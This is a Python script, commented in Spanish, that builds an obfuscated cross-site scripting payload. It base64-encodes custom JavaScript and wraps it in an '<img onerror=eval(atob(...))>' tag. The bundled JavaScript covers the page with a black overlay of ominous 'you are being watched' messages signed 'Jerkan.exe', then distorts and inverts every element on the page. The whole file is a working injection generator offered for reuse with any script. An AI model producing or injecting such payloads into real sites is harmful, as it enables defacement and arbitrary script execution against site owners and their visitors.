import base64

def generar_payload(js_code):
    # Comprimir el script en una sola línea
    js_min = " ".join(js_code.strip().splitlines())
    
    # Codificar en Base64
    b64 = base64.b64encode(js_min.encode()).decode()

    # Armar payload
    payload = f'<img src=x onerror="eval(atob(\'{b64}\'))">'
    return payload

# === Tu código JS personalizado ===
js = """
(function(){
  // 1. Pantalla negra inicial
  const overlay = document.createElement('div');
  Object.assign(overlay.style, {
    position: 'fixed',
    top: 0, left: 0,
    width: '100vw',
    height: '100vh',
    backgroundColor: 'black',
    color: 'lime',
    fontFamily: 'monospace',
    fontSize: '18px',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center',
    alignItems: 'center',
    zIndex: 999999,
    padding: '20px',
    textAlign: 'center'
  });
  document.body.appendChild(overlay);

  const log = document.createElement('div');
  overlay.appendChild(log);

  const messages = [
    "Despierta...",
    "Esto no es real.",
    "Te estoy viendo.",
    "Tu mundo es una simulación.",
    "Te lo demostraré...",
    "Desconectando capas visuales...",
    "Interfaz comprometida...",
    "Control restablecido.",
    "Has despertado.",
    "Bienvenido al nivel real.",
    "Jerkan.exe"
  ];

  let index = 0;
  const interval = setInterval(() => {
    if (index < messages.length) {
      const p = document.createElement('p');
      p.textContent = messages[index++];
      p.style.margin = '4px 0';
      overlay.appendChild(p);
    } else {
      clearInterval(interval);
      triggerGlitch();
    }
  }, 1600);

  // 2. Glitch visual
  function triggerGlitch() {
    const all = document.querySelectorAll('*:not(script):not(style):not([id^="GPT"])');
    all.forEach(el => {
      el.style.transition = 'all 0.5s ease';
      el.style.transform = `rotate(${Math.random() * 20 - 10}deg) scale(${0.8 + Math.random()*0.4})`;
      el.style.opacity = '0.3';
      el.style.filter = 'invert(1) hue-rotate(180deg)';
    });

    // Matrix rain effect
    const rain = document.createElement('div');
    rain.style.position = 'fixed';
    rain.style.top = '0';
    rain.style.left = '0';
    rain.style.width = '100vw';
    rain.style.height = '100vh';
    rain.style.zIndex = '999998';
    rain.style.background = 'repeating-linear-gradient(to bottom, rgba(0,255,0,0.05) 0px, rgba(0,255,0,0.1) 2px, transparent 4px)';
    rain.style.pointerEvents = 'none';
    document.body.appendChild(rain);
  }
})();
"""

print(generar_payload(js))
